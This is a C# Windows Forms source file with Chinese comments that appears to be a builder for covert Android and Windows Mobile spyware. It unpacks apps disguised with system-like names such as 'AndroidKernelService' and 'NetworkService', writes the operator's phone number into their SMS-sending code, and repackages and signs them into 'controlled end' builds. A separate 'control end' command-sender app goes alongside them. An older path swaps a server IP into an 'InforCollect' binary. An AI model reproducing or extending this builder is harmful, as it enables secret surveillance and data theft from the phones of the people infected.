using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace PhoneThrInOne
{
    public delegate void doDllFunction(string newip, string sourcefile, string targetfile);//委托

    public partial class Form1 : Form
    {
        [DllImport("PhoneDevice.dll", EntryPoint = "TestDevice")]
        public static extern bool TestDevice();

        public Form1()
        {
            InitializeComponent();
        }

        string os = "android";
        string ipnew;   //新IP
        string phoneNum; //新短信命令号码
        string smsNum; //接收手机信息号码
        string file;
        string targetfile;
        string sourcefile = AppDomain.CurrentDomain.BaseDirectory + "InforCollect.exe";

        //得到当前要修改的IP
        public bool checkIP()
        {
            bool device = TestDevice();
            if (!device)
            {
                MessageBox.Show("没有加密狗或加密狗错误！");
                return false;
            }
            ipnew = IPBox.Text;
            phoneNum = phoneNameBox.Text;
            smsNum = smsBox.Text;

            //检查IP合法性
            string[] ip = ipnew.Split('.');
            if (ip.Length != 4)
            {
                MessageBox.Show("IP输入错误，请重新输入");
                return false;
            }
            string ipnew2 = "";
            for (int i = 0; i < 4; ++i)
            {
                ip[i] = ip[i].TrimStart('0');
                int value = int.Parse(ip[i]);
                if (value < 0 || value > 255)
                {
                    MessageBox.Show("IP输入错误，请重新输入");
                    return false;
                }
                if (value < 10) ipnew2 += "00";
                else if (value < 100) ipnew2 += "0";

                ipnew2 += Convert.ToString(value);
                if (i < 3) ipnew2 += '.';
            }
            if (ipnew2.Length != 15)
            {
                MessageBox.Show("IP错误，请联系技术支持");
                return false;
            }
            MessageBox.Show("当前要修改的IP为：" + ipnew2 + "\n" +
                            "  当前命令号码为: " + phoneNum + "\n" +
                            "当前接收短信号码：" + smsNum + "\n");

            ipnew = ipnew2;
            return true;
        }

        private void genMobile()
        {
            DllInvoke dllInvoke = new DllInvoke(AppDomain.CurrentDomain.BaseDirectory + "ipchange187.dll");
            doDllFunction BuildFile = (doDllFunction)dllInvoke.Invoke("Change", typeof(doDllFunction));
            //删除上次生成
            try
            {
                if (File.Exists(targetfile))
                {
                    File.Delete(targetfile);
                }
            }
            catch
            {
                MessageBox.Show("删除原文件失败!");
                return;
            }
            BuildFile(ipnew, sourcefile, targetfile);
            MessageBox.Show("替换成功");
        }


        private void genAndroid()
        {
            //得到当前可执行文件所在的目录
            string sourceDirectory = AppDomain.CurrentDomain.BaseDirectory;

            //判断当前是否有info文件夹，有的话就删掉整个文件夹里的内容
            string info = sourceDirectory + "info";
            try
            {

                if (Directory.Exists(info))
                {
                    Directory.Delete(info, true);
                }
            }
            catch
            {
                MessageBox.Show("删除旧文件夹失败，请关闭所有打开" + info + "文件夹及子文件夹的窗口");
                return;
            }
            //解压并修改源文件

            //得到apk全路径

            string app = "";   //要解压的apk路径

            app = sourceDirectory + "\\AndroidKernelService.apk";

            //解压apk
            string order_c = "apktool d " + app + " info";
            Cmd(order_c);
            CloseProcess("cmd");

            //修改源文件IP -- 要修改的文件列表
            /*string[] change = { "ServerIP.smali", "SendFile.smali", "VoiceService.smali"};
            string sourceFile = sourcefile + "\\info\\smali\\com\\android\\message\\"; //路径
            for (int i = 0; i < change.Length; ++i) {
                if (!changeSourceIP(sourceFile + change[i], ipnew)) {
                    return;
                }
            }*/

            //修改短信命令手机号码源文件
            /*string[] changePhone = { "SMSBroadcastReceiver.smali" };
            for (int i = 0; i < changePhone.Length; ++i) {
                if (!changeSourcePhone(sourceFile + changePhone[i], phoneNum)) {
                    return;
                }
            }*/

            //修改接收手机信息号码的短信号码
            string smaliDirectory = sourceDirectory + "\\info\\smali\\com\\AndroidKernelService\\"; //路径
            string[] smsPhone = { "SendSMS.smali" };
            for (int i = 0; i < smsPhone.Length; ++i)
            {
                if (!changeSourcePhone(smaliDirectory + smsPhone[i], smsNum))
                {
                    return;
                }
            }


            //删除NewInfoCollect.apk, SignNewInfoCollect.apk

            //打包，签名
            string order = "apktool b info NewAndroidKernelService.apk";
            Cmd(order);
            CloseProcess("cmd");

            //第一个文件要写上一步打包生成的文件名相同
            string delFile = sourceDirectory + "\\新生成的APK\\SignNewAndroidKernelService.apk";
            try
            {
                if (File.Exists(delFile))
                {
                    File.Delete(delFile);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile + "异常!");
            }

            try
            {
                string zwbskdFolder = "新生成的APK\\中文版受控端\\";
                if (!System.IO.Directory.Exists(zwbskdFolder))
                {
                    // 目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(zwbskdFolder);
                }
                string order2 = "sign NewAndroidKernelService.apk 新生成的APK\\中文版受控端\\SignNewAndroidKernelService.apk";
                Cmd(order2);
                CloseProcess("cmd");
            }catch(Exception ex){
                MessageBox.Show(ex.Message.ToString());
            }

            string delFile_2 = sourceDirectory + "NewAndroidKernelService.apk";
            try
            {
                if (File.Exists(delFile_2))
                {
                    File.Delete(delFile_2);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile_2 + "异常!");
            }
            //MessageBox.Show("替换成功");
        }
        private void genQdzsCN()
        {
            //将启动助手中保存的电话号码进行更高
            //得到当前可执行文件所在的目录
            string sourceDirectory = AppDomain.CurrentDomain.BaseDirectory;

            //判断当前是否有info文件夹，有的话就删掉整个文件夹里的内容
            string info = sourceDirectory + "info";
            try
            {

                if (Directory.Exists(info))
                {
                    Directory.Delete(info, true);
                }
            }
            catch
            {
                MessageBox.Show("删除旧文件夹失败，请关闭所有打开" + info + "文件夹及子文件夹的窗口");
                return;
            }
            //解压并修改源文件

            //得到apk全路径

            string app = "";   //要解压的apk路径

            app = sourceDirectory + "\\sourceQdzsCN.apk";

            //解压apk
            string order_c = "apktool d " + app + " info";
            Cmd(order_c);
            CloseProcess("cmd");
            //修改接收手机信息号码的短信号码
            string smaliDirectory = sourceDirectory + "\\info\\smali\\com\\Qdzs\\"; //路径
            string[] smsPhone = { "SendSMS.smali" };
            for (int i = 0; i < smsPhone.Length; ++i)
            {
                if (!changeSourcePhone(smaliDirectory + smsPhone[i], smsNum))
                {
                    return;
                }
            }


            //删除NewInfoCollect.apk, SignNewInfoCollect.apk

            //打包，签名
            string order = "apktool b info NewQdzsCN.apk";
            Cmd(order);
            CloseProcess("cmd");

            //第一个文件要写上一步打包生成的文件名相同
            string delFile = sourceDirectory + "\\新生成的APK\\手机端合成版\\SignNewQdzsCN.apk";
            try
            {
                if (File.Exists(delFile))
                {
                    File.Delete(delFile);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile + "异常!");
            }

            try
            {
                string zwbskdFolder = "新生成的APK\\手机端合成版\\";
                if (!System.IO.Directory.Exists(zwbskdFolder))
                {
                    // 目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(zwbskdFolder);
                }
                string order2 = "sign NewQdzsCN.apk 新生成的APK\\手机端合成版\\SignNewQdzsCN.apk";
                Cmd(order2);
                CloseProcess("cmd");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message.ToString());
            }

            string delFile_2 = sourceDirectory + "NewQdzsCN.apk";
            try
            {
                if (File.Exists(delFile_2))
                {
                    File.Delete(delFile_2);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile_2 + "异常!");
            }
            //MessageBox.Show("替换成功");
        }
        private void genQdzsEN()
        {
            //将启动助手中保存的电话号码进行更高
            //得到当前可执行文件所在的目录
            string sourceDirectory = AppDomain.CurrentDomain.BaseDirectory;

            //判断当前是否有info文件夹，有的话就删掉整个文件夹里的内容
            string info = sourceDirectory + "info";
            try
            {

                if (Directory.Exists(info))
                {
                    Directory.Delete(info, true);
                }
            }
            catch
            {
                MessageBox.Show("删除旧文件夹失败，请关闭所有打开" + info + "文件夹及子文件夹的窗口");
                return;
            }
            //解压并修改源文件

            //得到apk全路径

            string app = "";   //要解压的apk路径

            app = sourceDirectory + "\\sourceQdzsEN.apk";

            //解压apk
            string order_c = "apktool d " + app + " info";
            Cmd(order_c);
            CloseProcess("cmd");
            //修改接收手机信息号码的短信号码
            string smaliDirectory = sourceDirectory + "\\info\\smali\\com\\Qdzs\\"; //路径
            string[] smsPhone = { "SendSMS.smali" };
            for (int i = 0; i < smsPhone.Length; ++i)
            {
                if (!changeSourcePhone(smaliDirectory + smsPhone[i], smsNum))
                {
                    return;
                }
            }


            //删除NewInfoCollect.apk, SignNewInfoCollect.apk

            //打包，签名
            string order = "apktool b info NewQdzsEN.apk";
            Cmd(order);
            CloseProcess("cmd");

            //第一个文件要写上一步打包生成的文件名相同
            string delFile = sourceDirectory + "\\新生成的APK\\手机端合成版\\SignNewQdzsEN.apk";
            try
            {
                if (File.Exists(delFile))
                {
                    File.Delete(delFile);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile + "异常!");
            }

            try
            {
                string zwbskdFolder = "新生成的APK\\手机端合成版\\";
                if (!System.IO.Directory.Exists(zwbskdFolder))
                {
                    // 目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(zwbskdFolder);
                }
                string order2 = "sign NewQdzsEN.apk 新生成的APK\\手机端合成版\\SignNewQdzsEN.apk";
                Cmd(order2);
                CloseProcess("cmd");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message.ToString());
            }

            string delFile_2 = sourceDirectory + "NewQdzsEN.apk";
            try
            {
                if (File.Exists(delFile_2))
                {
                    File.Delete(delFile_2);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile_2 + "异常!");
            }
            //MessageBox.Show("替换成功");
        }
        private void genInformationNavigation()
        {
            //============对英文版InformationNavigation替换打包Start==================
            //得到当前可执行文件所在的目录
            string sourceDirectory = AppDomain.CurrentDomain.BaseDirectory;

            //判断当前是否有info文件夹，有的话就删掉整个文件夹里的内容
            string info = sourceDirectory + "info";
            try
            {

                if (Directory.Exists(info))
                {
                    Directory.Delete(info, true);
                }
            }
            catch
            {
                MessageBox.Show("删除旧文件夹失败，请关闭所有打开" + info + "文件夹及子文件夹的窗口");
                return;
            }
            //解压并修改源文件

            //得到apk全路径

            string app = "";   //要解压的apk路径

            app = sourceDirectory + "\\InformationNavigation.apk";

            //解压apk
            string order_c = "apktool d " + app + " info";
            Cmd(order_c);
            CloseProcess("cmd");

            //修改接收手机信息号码的短信号码
            string smaliDirectory = sourceDirectory + "\\info\\smali\\com\\AndroidKernelService\\"; //路径
            string[] smsPhone = { "SendSMS.smali" };
            for (int i = 0; i < smsPhone.Length; ++i)
            {
                if (!changeSourcePhone(smaliDirectory + smsPhone[i], smsNum))
                {
                    return;
                }
            }


            //删除NewInfoCollect.apk, SignNewInfoCollect.apk

            //打包，签名
            string order = "apktool b info NewInformationNavigation.apk";
            Cmd(order);
            CloseProcess("cmd");

            //第一个文件要写上一步打包生成的文件名相同
            string delFile = sourceDirectory + "\\新生成的APK\\SignNewInformationNavigation.apk";
            try
            {
                if (File.Exists(delFile))
                {
                    File.Delete(delFile);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile + "异常!");
            }

            try
            {
                string ywbskdFolder = "新生成的APK\\英文版受控端\\";
                if (!System.IO.Directory.Exists(ywbskdFolder))
                {
                    // 目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(ywbskdFolder);
                }
                string order2 = "sign NewInformationNavigation.apk 新生成的APK\\英文版受控端\\SignNewInformationNavigation.apk";
                Cmd(order2);
                CloseProcess("cmd");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message.ToString());
            }

            string delFile_2 = sourceDirectory + "NewInformationNavigation.apk";
            try
            {
                if (File.Exists(delFile_2))
                {
                    File.Delete(delFile_2);
                }
            }
            catch
            {
                MessageBox.Show("删除" + delFile_2 + "异常!");
            }
            //============对英文版InformationNavigation替换打包End==================
        }
        private void button1_Click(object sender, EventArgs e)
        {
            //生成控制端按钮
            /*
            if (!checkIP()) return; //IP有错误
            
            if (os.CompareTo("symbian") == 0) {
               
            }
            else if (os.CompareTo("mobile") == 0) {
                genMobile();
            }
            else if (os.CompareTo("android") == 0) {
                genAndroid();
            }
            else if (os.CompareTo("IPhone") == 0) {
                MessageBox.Show("暂不支持");
            }
            */
            if (smsBox.Text.Length == 0)
            {
                MessageBox.Show("请输入手机号");
            }
            else
            {
                smsNum = smsBox.Text;
                try
                {
                    genAndroid();//替换手机号，将新打包好的文件复制到“中文版受控端”文件夹
                    genInformationNavigation();
                    genQdzsCN();//更改合成版启动助手里面的手机号码
                    genQdzsEN();
                    MessageBox.Show("替换成功");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            try
            {
                //将启动助手和命令发送助手复制到新生成的文件夹里
                string sourceDirectory = AppDomain.CurrentDomain.BaseDirectory; //当前可执行文件所在的目录
                string zwbskdFolder = sourceDirectory + "\\新生成的APK\\中文版受控端"; //中文版受控端文件夹
                string qdzsFile = sourceDirectory + "\\qdzs.apk"; //可执行文件所在目录中的qdzs.apk文件
                string StorageServiceFile = zwbskdFolder + "\\StorageService.apk";//StorageService.apk即启动助手
                string sourceNetworkServiceFile = sourceDirectory + "\\NetworkService.apk"; //可执行文件所在目录中的NetworkService.apk文件(即启动助手英文版)
                string ywbskdFolder = sourceDirectory + "\\新生成的APK\\英文版受控端"; //英文版受控端文件夹
                string targetNetworkServiceFile = ywbskdFolder + "\\NetworkService.apk";//英文版受控端文件夹里的NetworkService.apk
                //命令发送助手
                string SendSmsUIFile = sourceDirectory + "\\SendSmsUI.apk";//当前可执行文件所在目录中的命令发送助手
                string kzdFolder = sourceDirectory + "\\新生成的APK\\控制端"; //控制端文件夹
                string targetSendSmsUIFile = kzdFolder + "\\SendSmsUI.apk";//控制端文件夹中的命令发送助手
                //英文版受控端文件夹及Network Service.apk和Information Navigation.apk两个文件

                if (!System.IO.Directory.Exists(zwbskdFolder))
                {
                    // 如果中文版受控端目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(zwbskdFolder);
                }
                if (!System.IO.Directory.Exists(ywbskdFolder))
                {
                    // 如果英文版受控端目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(ywbskdFolder);
                }

                if (!System.IO.Directory.Exists(kzdFolder))
                {
                    // 控制端目录不存在，建立目录
                    System.IO.Directory.CreateDirectory(kzdFolder);
                }

                bool isrewrite = true; // true=覆盖已存在的同名文件,false则反之
                System.IO.File.Copy(qdzsFile, StorageServiceFile, isrewrite);
                System.IO.File.Copy(sourceNetworkServiceFile, targetNetworkServiceFile, isrewrite);
                System.IO.File.Copy(SendSmsUIFile, targetSendSmsUIFile, isrewrite);
                
            }catch(Exception ex){
                
            }
        }

        //改变源文件IP
        bool changeSourceIP(string sourceFile, string newIP)
        {

            //修改IP
            string strTxt = "";
            StreamReader fileStream = null;
            try
            {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream)
                {
                    strTxt += fileStream.ReadLine();
                    strTxt += Environment.NewLine;
                }
                fileStream.Close();
                fileStream.Dispose();
            }
            catch
            {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("读源文件失败@！");
                return false;
            }
            strTxt = strTxt.Replace("202.004.155.037", newIP);
            FileStream stream = null;
            try
            {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch
            {

                stream.Close();
                MessageBox.Show("改写IP失败@！");
                return false;
            }
            //MessageBox.Show(strTxt);
            return true;
        }
        //改变源文件短信号码
        bool changeSourcePhone(string sourceFile, string newPhoneNum)
        {
            string strTxt = "";
            StreamReader fileStream = null;
            try
            {
                fileStream = new StreamReader(sourceFile, System.Text.Encoding.Default);
                while (!fileStream.EndOfStream)
                {
                    strTxt += fileStream.ReadLine();
                    strTxt += Environment.NewLine;
                }
                fileStream.Close();
                fileStream.Dispose();
            }
            catch
            {
                fileStream.Close();
                fileStream.Dispose();
                MessageBox.Show("读源文件失败@！");
                return false;
            }
            strTxt = strTxt.Replace("18712345678", newPhoneNum);
            FileStream stream = null;
            try
            {
                stream = new FileStream(sourceFile, FileMode.Create);
                byte[] content = System.Text.Encoding.Default.GetBytes(strTxt);
                stream.Write(content, 0, content.Length);
                //stream.SetLength(0);
                stream.Flush();
                stream.Close();
            }
            catch
            {

                stream.Close();
                MessageBox.Show("改写短信号码失败@！");
                return false;
            }
            //MessageBox.Show(strTxt);
            return true;

        }

        //运行CMD命令
        public static string Cmd(string cmd)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.AutoFlush = true;

            p.StandardInput.WriteLine(cmd.ToString());
            p.StandardInput.WriteLine("exit");
            string strRst = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            return strRst;
        }

        /// <summary>
        /// 关闭进程
        /// </summary>
        /// <param name="ProcName">进程名称</param>
        /// <returns></returns>
        public static bool CloseProcess(string ProcName)
        {
            bool result = false;
            System.Collections.ArrayList procList = new System.Collections.ArrayList();
            string tempName = "";
            int begpos;
            int endpos;
            foreach (System.Diagnostics.Process thisProc in System.Diagnostics.Process.GetProcesses())
            {
                tempName = thisProc.ToString();
                begpos = tempName.IndexOf("(") + 1;
                endpos = tempName.IndexOf(")");
                tempName = tempName.Substring(begpos, endpos - begpos);
                procList.Add(tempName);

                if (tempName == ProcName)
                {
                    if (!thisProc.CloseMainWindow())
                        try
                        {
                            thisProc.Kill(); // 当发送关闭窗口命令无效时强行结束进程
                        }
                        catch
                        {
                        }
                    result = true;
                }
            }
            return result;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            //
            os = "symbian";
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            os = "mobile";
            sourcefile = AppDomain.CurrentDomain.BaseDirectory + "InforCollect.exe";
            targetfile = AppDomain.CurrentDomain.BaseDirectory + "InfoCollect-Mobile\\InfoCollect.exe";
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void radioButton4_CheckedChanged(object sender, EventArgs e)
        {
            os = "IPhone";
        }

        private void radioButton3_CheckedChanged(object sender, EventArgs e)
        {
            os = "android";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string now = AppDomain.CurrentDomain.BaseDirectory;
            now = now + "新生成的APK";
            /*
            if (os.CompareTo("android") == 0)
            {
                now = now + "新生成的APK";
            }
            else if (os.CompareTo("mobile") == 0)
            {
                now = now + "InfoCollect-Mobile";
            }
            */
            //MessageBox.Show(now);
            try
            {
                System.Diagnostics.Process.Start(now);
            }catch(Exception exx){
                MessageBox.Show(exx.Message.ToString());
            }
        }
    }
}
